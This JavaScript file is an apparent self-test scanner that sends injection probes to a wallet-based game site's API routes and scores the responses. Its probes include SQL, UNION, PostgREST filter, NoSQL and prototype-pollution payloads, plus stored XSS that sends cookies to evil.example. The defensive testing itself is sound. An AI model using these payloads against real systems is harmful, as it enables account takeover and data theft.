// Sensitive keywords that indicate server error details are leaking in response body
const LEAK_KEYWORDS = ['stack', 'traceback', 'exception', 'pg_', 'postgres', 'supabase', 'sql', 'syntax error', 'at Object.', 'at async', 'ECONNREFUSED']

function detectLeak(text) {
  const t = (text || '').toLowerCase()
  return LEAK_KEYWORDS.find(k => t.includes(k.toLowerCase())) || null
}

// Classify result: 200=fail, 500+leak=warn(info disclosure), 4xx/405=pass
function classify(status, preview) {
  if (status === 200) return { result: 'fail', note: 'Unexpected 200 — payload may have been accepted' }
  if (status >= 500) {
    const leak = detectLeak(preview)
    if (leak) return { result: 'warn', note: `HTTP 500 with sensitive keyword "${leak}" — server error details leaked` }
    return { result: 'pass', note: `HTTP ${status} — server error but no sensitive details in response` }
  }
  return { result: 'pass', note: `HTTP ${status} — correctly rejected` }
}

async function send(url, method, body, timeoutMs = 7000) {
  const t0 = Date.now()
  try {
    const res = await fetch(url, {
      method,
      headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
      body: body !== null ? JSON.stringify(body) : undefined,
      signal: AbortSignal.timeout(timeoutMs),
    })
    const text = await res.text().catch(() => '')
    return { status: res.status, preview: text.slice(0, 150), ms: Date.now() - t0 }
  } catch (e) {
    return { status: 0, preview: e.message?.slice(0, 80), ms: Date.now() - t0 }
  }
}

async function sendGet(url, timeoutMs = 7000) {
  const t0 = Date.now()
  try {
    const res = await fetch(url, { signal: AbortSignal.timeout(timeoutMs) })
    const text = await res.text().catch(() => '')
    return { status: res.status, preview: text.slice(0, 150), ms: Date.now() - t0 }
  } catch (e) {
    return { status: 0, preview: e.message?.slice(0, 80), ms: Date.now() - t0 }
  }
}

export async function runInjectionScanCheck(siteUrl) {
  const base = siteUrl

  // ── All probes defined as descriptors, executed in parallel ──────────────────
  const PROBES = [

    // ── Category 1: PostgREST / Supabase Filter Injection ────────────────────
    // relay/exec interpolates `wallet` directly into .or() filter string (line 58 route.js)
    // normalizeWallet() only lowercases+trims — no escaping of PostgREST syntax chars
    {
      id: 'postgrest_or_wallet',
      category: 'PostgREST Filter Injection',
      severity: 'HIGH',
      label: 'relay/exec — wallet field injected into .or() filter',
      endpoint: 'POST /api/relay/exec',
      body: { wallet: '0xaaaa,wallet_origin.eq.0xbbbb', targetWallet: '0xbbbb' },
      rationale: 'wallet and targetWallet are interpolated into .or(`...wallet_origin.eq.${wallet}...`) without escaping PostgREST syntax. Injecting comma-separated filter clauses can alter the cooldown check logic and potentially bypass the 24h relay cooldown.',
      attacks: 'Cooldown bypass, filter clause injection, unauthorized relay execution',
      run: () => send(`${base}/api/relay/exec`, 'POST', { wallet: '0xaaaa,wallet_origin.eq.0xbbbb', targetWallet: '0xbbbb' }),
    },
    {
      id: 'postgrest_or_target',
      category: 'PostgREST Filter Injection',
      severity: 'HIGH',
      label: 'relay/exec — targetWallet injected into .or() filter',
      endpoint: 'POST /api/relay/exec',
      body: { wallet: '0xaaaa', targetWallet: '0xbbbb),and(wallet_origin.eq.0xaaaa,wallet_target.is.null' },
      rationale: 'targetWallet also interpolated into the same .or() filter — injecting closing parentheses and new conditions can produce a PostgREST query that always returns null, bypassing the cooldown check entirely.',
      attacks: 'Cooldown bypass via always-null cooldown query, unauthorized relay chain execution',
      run: () => send(`${base}/api/relay/exec`, 'POST', { wallet: '0xaaaa', targetWallet: '0xbbbb),and(wallet_origin.eq.0xaaaa,wallet_target.is.null' }),
    },
    {
      id: 'sql_classic_wallet',
      category: 'SQL Injection',
      severity: 'CRITICAL',
      label: 'daily-tasks/claim — classic OR injection via wallet',
      endpoint: 'POST /api/daily-tasks/claim',
      body: { wallet: "' OR '1'='1' --" },
      rationale: "Classic SQL injection via wallet field. If the backend uses raw SQL string building instead of parameterized Supabase client, this bypasses all wallet-based conditions.",
      attacks: 'Authentication bypass, reward claiming for any wallet',
      run: () => send(`${base}/api/daily-tasks/claim`, 'POST', { wallet: "' OR '1'='1' --" }),
    },
    {
      id: 'sql_union_wallet',
      category: 'SQL Injection',
      severity: 'CRITICAL',
      label: 'daily-tasks/claim — UNION-based injection via wallet',
      endpoint: 'POST /api/daily-tasks/claim',
      body: { wallet: "x' UNION SELECT null,null,null,null --" },
      rationale: 'UNION-based injection attempts to append a second SELECT to the query, potentially exfiltrating table schema or data rows into the response.',
      attacks: 'Data exfiltration, schema discovery, row injection into result set',
      run: () => send(`${base}/api/daily-tasks/claim`, 'POST', { wallet: "x' UNION SELECT null,null,null,null --" }),
    },
    {
      id: 'sql_stacked_rm_rf',
      category: 'SQL Injection',
      severity: 'CRITICAL',
      label: 'rm-rf-chain — stacked query via chip field',
      endpoint: 'POST /api/rm-rf-chain',
      body: { chip: "1; SELECT pg_sleep(0)--", wallet: 'pentest' },
      rationale: 'Stacked query injection via the chip field — attempts to append a secondary SQL statement. pg_sleep(0) is harmless; a real attacker would use pg_sleep(5) for blind timing detection or run DML statements.',
      attacks: 'Blind SQL injection, data destruction, privilege escalation via stacked statements',
      run: () => send(`${base}/api/rm-rf-chain`, 'POST', { chip: "1; SELECT pg_sleep(0)--", wallet: 'pentest' }),
    },
    {
      id: 'sql_pool_field',
      category: 'SQL Injection',
      severity: 'HIGH',
      label: 'dispute/vote — injection via challengerPool field',
      endpoint: 'POST /api/wallet-pools/dispute/vote',
      body: { wallet: '0xaaaa', challengerPool: "' OR '1'='1", defenderPool: 'POOL_B' },
      rationale: 'Pool name fields are strings fed into Supabase filters. If not parameterized, injecting SQL into challengerPool/defenderPool could bypass pool membership validation.',
      attacks: 'Pool membership bypass, unauthorized vote casting, tournament manipulation',
      run: () => send(`${base}/api/wallet-pools/dispute/vote`, 'POST', { wallet: '0xaaaa', challengerPool: "' OR '1'='1", defenderPool: 'POOL_B' }),
    },
    {
      id: 'sql_hidden_cmd',
      category: 'SQL Injection',
      severity: 'HIGH',
      label: 'exec-hidden-cmd — injection via command field',
      endpoint: 'POST /api/exec-hidden-cmd',
      body: { wallet: '0xaaaa', command: "/'; SELECT * FROM mm3_player_progress--" },
      rationale: 'command must start with / (passes the check), then is used in .eq("hidden_command", command). If not parameterized, the injected SQL would run as part of the hidden_command lookup query.',
      attacks: 'Data exfiltration from hidden command table, player progress table dump',
      run: () => send(`${base}/api/exec-hidden-cmd`, 'POST', { wallet: '0xaaaa', command: "/'; SELECT * FROM mm3_player_progress--" }),
    },

    // ── Category 2: JSON / NoSQL Type Confusion ───────────────────────────────
    {
      id: 'nosql_wallet_obj',
      category: 'JSON/NoSQL Injection',
      severity: 'HIGH',
      label: 'daily-tasks/claim — wallet as object {"$gt":""}',
      endpoint: 'POST /api/daily-tasks/claim',
      body: { wallet: { $gt: '' } },
      rationale: 'MongoDB-style operator injection via wallet field. If the backend or any middleware evaluates operator objects, this bypasses wallet equality checks.',
      attacks: 'Authentication bypass, arbitrary wallet impersonation',
      run: () => send(`${base}/api/daily-tasks/claim`, 'POST', { wallet: { $gt: '' } }),
    },
    {
      id: 'json_wallet_array',
      category: 'JSON Type Confusion',
      severity: 'MEDIUM',
      label: 'daily-tasks/claim — wallet as array',
      endpoint: 'POST /api/daily-tasks/claim',
      body: { wallet: ['0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266', '0x0000000000000000000000000000000000000000'] },
      rationale: 'Passing an array where a string is expected can trigger unexpected type coercion. In JavaScript String(array) produces a comma-joined string — may bypass length/format validation.',
      attacks: 'Type coercion bypass, dual-wallet claim attempt',
      run: () => send(`${base}/api/daily-tasks/claim`, 'POST', { wallet: ['0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266', '0x0000000000000000000000000000000000000000'] }),
    },
    {
      id: 'json_chip_array',
      category: 'JSON Type Confusion',
      severity: 'MEDIUM',
      label: 'rm-rf-chain — chip as array [1,2]',
      endpoint: 'POST /api/rm-rf-chain',
      body: { chip: [1, 2], wallet: 'pentest' },
      rationale: 'chip is Number(body.chip) — Number([1,2]) = NaN, Number([1]) = 1. Sending [1] passes the chipNum check, potentially triggering both chip cooldowns. Sending [1,2] should be rejected but tests NaN handling.',
      attacks: 'Cooldown logic confusion, simultaneous chip activation',
      run: () => send(`${base}/api/rm-rf-chain`, 'POST', { chip: [1, 2], wallet: 'pentest' }),
    },
    {
      id: 'json_chip_single_array',
      category: 'JSON Type Confusion',
      severity: 'MEDIUM',
      label: 'rm-rf-chain — chip as [1] (single-element array)',
      endpoint: 'POST /api/rm-rf-chain',
      body: { chip: [1], wallet: 'pentest' },
      rationale: 'Number([1]) === 1 in JavaScript — a single-element array passes the chip number check. This probes if the server rejects non-numeric types before the Number() cast.',
      attacks: 'Type confusion to trigger chain wipe without proper chip validation',
      run: () => send(`${base}/api/rm-rf-chain`, 'POST', { chip: [1], wallet: 'pentest' }),
    },

    // ── Category 3: Integer Overflow / Bounds ─────────────────────────────────
    {
      id: 'int_answer_negative',
      category: 'Integer Overflow / Bounds',
      severity: 'MEDIUM',
      label: 'chain-solve/attempt — answer: -999999999',
      endpoint: 'POST /api/chain-solve/attempt',
      body: { wallet: '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266', answer: -999999999 },
      rationale: 'Negative integer answer. Route does parseInt(body.answer, 10) and checks answer < 1 — should reject. Tests whether the < 1 guard is in place and working.',
      attacks: 'Bypass math puzzle validation with negative values',
      run: () => send(`${base}/api/chain-solve/attempt`, 'POST', { wallet: '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266', answer: -999999999 }),
    },
    {
      id: 'int_answer_float',
      category: 'Integer Overflow / Bounds',
      severity: 'LOW',
      label: 'chain-solve/attempt — answer: MAX_SAFE_INTEGER+1',
      endpoint: 'POST /api/chain-solve/attempt',
      body: { wallet: '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266', answer: Number.MAX_SAFE_INTEGER + 1 },
      rationale: 'parseInt of a value beyond MAX_SAFE_INTEGER loses precision and may produce an unexpected integer, potentially matching the correct answer by coincidence on edge puzzle states.',
      attacks: 'Integer precision bypass for puzzle solutions',
      run: () => send(`${base}/api/chain-solve/attempt`, 'POST', { wallet: '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266', answer: Number.MAX_SAFE_INTEGER + 1 }),
    },
    {
      id: 'int_page_negative',
      category: 'Integer Overflow / Bounds',
      severity: 'LOW',
      label: 'leaderboard — page=-99999 &limit=-1',
      endpoint: 'GET /api/leaderboard?page=-99999&limit=-1',
      rationale: 'Negative page/limit values. Route does Math.max(parseInt(...), 1) for page and clamps limit 1-200. Tests if clamping works correctly and does not cause negative offset (page-1)*limit.',
      attacks: 'Negative offset DB query causing full table scan or unexpected row ordering',
      run: () => sendGet(`${base}/api/leaderboard?page=-99999&limit=-1`),
    },
    {
      id: 'int_limit_overflow',
      category: 'Integer Overflow / Bounds',
      severity: 'MEDIUM',
      label: 'leaderboard — limit=9999999 (missing clamp test)',
      endpoint: 'GET /api/leaderboard?page=1&limit=9999999',
      rationale: 'Extremely large limit value. Route clamps to 200, but this tests if clamping applies before or after the DB call. An unclamped limit could trigger a full table dump.',
      attacks: 'Full leaderboard table exfiltration, Supabase egress abuse',
      run: () => sendGet(`${base}/api/leaderboard?page=1&limit=9999999`),
    },

    // ── Category 4: Prototype Pollution ──────────────────────────────────────
    {
      id: 'proto_claim',
      category: 'Prototype Pollution',
      severity: 'MEDIUM',
      label: 'daily-tasks/claim — __proto__ injection',
      endpoint: 'POST /api/daily-tasks/claim',
      body: { wallet: 'x', __proto__: { isAdmin: true, authorized: true } },
      rationale: '__proto__ key in JSON body. If the server merges/spreads the body object onto another object, prototype pollution can inject properties into Object.prototype, affecting all object comparisons and checks in the same process.',
      attacks: 'isAdmin bypass, authorization flag injection, affects all objects in Node.js process',
      run: () => send(`${base}/api/daily-tasks/claim`, 'POST', { wallet: 'x', __proto__: { isAdmin: true, authorized: true } }),
    },
    {
      id: 'proto_constructor',
      category: 'Prototype Pollution',
      severity: 'MEDIUM',
      label: 'exec-hidden-cmd — constructor.prototype injection',
      endpoint: 'POST /api/exec-hidden-cmd',
      body: { wallet: 'x', command: '/mine', constructor: { prototype: { admin: true } } },
      rationale: 'constructor.prototype path pollution — alternative vector when __proto__ is blocked. Targets deep-merge or recursive-spread patterns that traverse the constructor key.',
      attacks: 'Prototype chain pollution, admin flag injection into all future objects',
      run: () => send(`${base}/api/exec-hidden-cmd`, 'POST', { wallet: 'x', command: '/mine', constructor: { prototype: { admin: true } } }),
    },

    // ── Category 5: Stored XSS via user-controlled fields ────────────────────
    {
      id: 'xss_script_wallet',
      category: 'Stored XSS',
      severity: 'HIGH',
      label: 'rm-rf-chain — <script> tag in wallet field',
      endpoint: 'POST /api/rm-rf-chain',
      body: { chip: 1, wallet: '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>' },
      rationale: 'wallet value is stored in mm3_chain_events ticker_message and trace columns. If the chain log is rendered as HTML without escaping in the Relaying terminal, stored XSS fires for all users viewing the log.',
      attacks: 'Stored XSS, session cookie theft, CSRF token exfiltration for all users viewing relay log',
      run: () => send(`${base}/api/rm-rf-chain`, 'POST', { chip: 1, wallet: '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>' }),
    },
    {
      id: 'xss_img_onerror',
      category: 'Stored XSS',
      severity: 'HIGH',
      label: 'rm-rf-chain — <img onerror> in wallet field',
      endpoint: 'POST /api/rm-rf-chain',
      body: { chip: 1, wallet: '<img src=x onerror="alert(document.domain)">' },
      rationale: 'img onerror XSS variant — executes without script tags, bypasses many naive HTML filters. Triggers immediately when the relay log entry is rendered.',
      attacks: 'Stored XSS bypassing script-tag filters, DOM-based code execution',
      run: () => send(`${base}/api/rm-rf-chain`, 'POST', { chip: 1, wallet: '<img src=x onerror="alert(document.domain)">' }),
    },
    {
      id: 'xss_svg_onload',
      category: 'Stored XSS',
      severity: 'HIGH',
      label: 'exec-hidden-cmd — <svg onload> in command field',
      endpoint: 'POST /api/exec-hidden-cmd',
      body: { wallet: '0xaaaa', command: '/<svg onload="fetch(`https://evil.example/?x=`+btoa(document.cookie))">' },
      rationale: 'SVG onload XSS in the command field. The command starts with / (passes validation), is stored in chain event logs. If rendered as HTML in the terminal, fires for all users.',
      attacks: 'Stored XSS via SVG payload, blind cookie exfiltration',
      run: () => send(`${base}/api/exec-hidden-cmd`, 'POST', { wallet: '0xaaaa', command: '/<svg onload="fetch(`https://evil.example/?x=`+btoa(document.cookie))">' }),
    },

    // ── Category 6: Error / Stack Trace Disclosure ───────────────────────────
    {
      id: 'err_invalid_json',
      category: 'Error Disclosure',
      severity: 'LOW',
      label: 'mine-block — malformed JSON body',
      endpoint: 'POST /api/mine-block',
      body: null,
      rationale: 'Sending malformed/empty JSON tests error handling. A well-hardened endpoint returns a generic 400; a poorly handled one may leak framework errors, file paths or stack traces.',
      attacks: 'Stack trace leakage, internal file path disclosure, Next.js version fingerprinting',
      run: async () => {
        const t0 = Date.now()
        try {
          const res = await fetch(`${base}/api/mine-block`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: '{bad json:::}',
            signal: AbortSignal.timeout(7000),
          })
          const text = await res.text().catch(() => '')
          return { status: res.status, preview: text.slice(0, 150), ms: Date.now() - t0 }
        } catch (e) {
          return { status: 0, preview: e.message, ms: Date.now() - t0 }
        }
      },
    },
    {
      id: 'err_missing_fields',
      category: 'Error Disclosure',
      severity: 'LOW',
      label: 'nudge-macro — missing required fields',
      endpoint: 'POST /api/nudge-macro',
      body: {},
      rationale: 'nudge-macro expects war_percent and nature_percent. An empty body exercises the clampMacroPercent fallback path and the Supabase upsert with default values. A 500 response here would indicate unhandled edge case.',
      attacks: 'Server error disclosure, internal function name / DB schema leakage',
      run: () => send(`${base}/api/nudge-macro`, 'POST', {}),
    },
  ]

  // Run all probes in parallel
  const results = await Promise.allSettled(PROBES.map(p => p.run()))

  const findings = PROBES.map((probe, i) => {
    const r = results[i].status === 'fulfilled' ? results[i].value : { status: 0, preview: results[i].reason?.message, ms: 0 }
    const { result, note } = classify(r.status, r.preview)

    // A passing result is still useful context — but only flag as fail/warn based on classify
    const findingStatus = result
    const findingSeverity = result === 'fail' ? probe.severity : result === 'warn' ? 'LOW' : null

    return {
      label:           probe.label,
      category:        probe.category,
      endpoint:        probe.endpoint,
      status:          findingStatus,
      severity:        findingSeverity,
      httpStatus:      r.status,
      responseMs:      r.ms,
      requestBody:     JSON.stringify(probe.body)?.slice(0, 120),
      responsePreview: r.preview,
      rationale:       probe.rationale,
      attacks:         probe.attacks,
      classifyNote:    note,
    }
  })

  const failed   = findings.filter(f => f.status === 'fail').length
  const warnings = findings.filter(f => f.status === 'warn').length
  const critical = findings.filter(f => f.status === 'fail' && f.severity === 'CRITICAL').length
  const high     = findings.filter(f => f.status === 'fail' && f.severity === 'HIGH').length
  const score    = Math.max(0, 100 - critical * 30 - high * 15 - (failed - critical - high) * 10 - warnings * 5)

  // Group summary by category for display
  const categories = [...new Set(PROBES.map(p => p.category))]
  const categoryResults = categories.map(cat => {
    const catFindings = findings.filter(f => f.category === cat)
    const catFails = catFindings.filter(f => f.status === 'fail').length
    return `${cat}: ${catFails === 0 ? '✓' : `✗ ${catFails} fail`}`
  }).join(' · ')

  return {
    id: 'injection_scan',
    name: 'Injection & Input Security',
    source: `${PROBES.length} targeted probes across ${categories.length} attack categories`,
    status: failed > 0 ? 'fail' : warnings > 0 ? 'warn' : 'pass',
    score,
    findings,
    probeDetails: {
      totalProbes: PROBES.length,
      parallelExecution: true,
      categories,
      endpoints: [...new Set(PROBES.map(p => p.endpoint))],
      attackMatrix: {
        'PostgREST Filter Injection': 'Wallet/target fields interpolated into .or() filter string in relay/exec — no escaping of PostgREST syntax chars',
        'SQL Injection': 'Classic OR, UNION-based, stacked query via wallet/pool/command/chip fields',
        'JSON/NoSQL Injection': 'MongoDB operator objects ($gt), wallet-as-array type coercion',
        'Integer Overflow': 'Negative values, MAX_SAFE_INTEGER+1, unclamped limit on leaderboard',
        'Prototype Pollution': '__proto__ and constructor.prototype keys in JSON body',
        'Stored XSS': '<script>, <img onerror>, <svg onload> in wallet/command fields stored in chain log',
        'Error Disclosure': 'Malformed/empty bodies to probe stack trace leakage in error responses',
      },
      passCondition: '4xx or 5xx without sensitive keywords in response body',
      failCondition: 'HTTP 200 (payload accepted) or 5xx with stack trace / SQL keywords',
      timeout: '7000ms per probe',
    },
    summary: failed === 0 && warnings === 0
      ? `All ${PROBES.length} injection probes correctly rejected — ${categoryResults}`
      : `${failed} failure${failed !== 1 ? 's' : ''}, ${warnings} warning${warnings !== 1 ? 's' : ''} — ${categoryResults}`,
  }
}
